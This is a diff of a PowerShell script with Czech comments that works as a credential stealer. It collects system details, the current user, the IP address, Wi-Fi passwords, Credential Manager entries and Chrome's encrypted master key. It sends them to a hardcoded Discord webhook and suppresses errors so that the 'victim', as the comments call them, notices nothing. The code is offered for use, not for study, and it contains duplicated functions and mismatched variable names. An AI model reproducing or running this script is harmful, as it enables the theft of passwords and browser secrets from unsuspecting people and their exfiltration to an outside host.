@@ -1,33 +1,49 @@
-$webhook = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_" # Sem dej URL pokud používáš Discord/Slack webhook
+# --- KONFIGURACE ---
+$webhook_url = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_"
+# ------------------
 
-function Send-Data($msg) {
-    Write-Host $msg
-    # Pokud máš webhook, odkomentuj řádek níže:
-    # Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$msg})
+function Send-Webhook {
+    param([string]$message)
+    $payload = @{ content = $message } | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType "application/json"
 }
 
-Send-Data "--- STARTING EXFILTRATION ---"
-Send-Data "User: $(whoami)"
+try {
+    # 1. Systémové informace
+    $os = (Get-WmiObject Win32_OperatingSystem).Caption
+    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $comp = hostname
+    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
+    
+    $sys_info = "🖥️ **SÝSTEM**: $comp`n👤 **Uživatel**: $user`n🌐 **IP**: $ip`n💿 **OS**: $os"
+    Send-Webhook -message $sys_info
 
-# 1. VÝTAH PISENÍ WI-FI HESEL (Opraveno)
-Send-Data "--- WI-FI PASSWORDS ---"
-$profiles = netsh wlan show profiles | Select-String "\:(.*)$" | ForEach-Object { $_.Matches.Value.Trim() }
-foreach ($p in $profiles) {
-    $pass = netsh wlan show profile name="$p" key=clear | Select-String "Key Content\:(.*)$" | ForEach-Object { $_.Matches.Value.Trim() }
-    if ($pass) {
-        Send-Data "Network: $p | Password: $pass"
-    } else {
-        Send-Data "Network: $p | Password: [Not Found/Open]"
+    # 2. Wi-Fi Heslo (Aktuální síť)
+    $wifi = netsh wlan show profile name="* " key=clear | Select-String "Key Content"
+    if ($wifi) {
+        $wifi_pass = $wifi.ToString().Split(":")[1].Trim()
+        Send-Webhook -message "🔑 **Wi-Fi Heslo**: $wifi_pass"
     }
+
+    # 3. Extrakce Master Key (Local State) z Chrome/Edge
+    # Cesta k Local State souboru
+    $localStatePath = "$env:LocalAppData\Google\Chrome\User Data\Local State"
+    if (Test-Path $localStatePath) {
+        $content = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $protectedKey = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content.os_crypt.encrypted_key))
+        
+        # Posíláme Base64 verzi klíče (to je to, co budeš potřebovat pro dekryptovaní)
+        Send-Webhook "🔐 **Chrome Master Key (B64):** `n$protectedKey"
+    }
+
+} catch {
+    # V případě chyby nic neposíláme, aby oběť nic nezpozorovala
 }
 
-# 2. WINDOWS CREDENTIAL MANAGER (Systémová hesla)
-Send-Data "--- SYSTEM CREDENTIALS ---"
-cmd /c "cmdkey /list" | Out-String | ForEach-Object { Send-Data $_ }
+function Send-Webhook($msg) {
+    $payload = @{ content = $msg } | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+}
 
-# 3. ZÁKLADNÍ INFO O SYSTÉMU
-Send-Data "--- SYSTEM INFO ---"
-Send-Data "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)"
-Send-Data "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -NotLike '*Loopback*').IPAddress)"
-
-Send-Data "--- EXFILTRATION COMPLETE ---"
+# Oprava volání funkce (pro jistotu)
+$webhookUrl = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_" # Znovu sem vlož URL, pokud nepoužíváš proměnnou výše
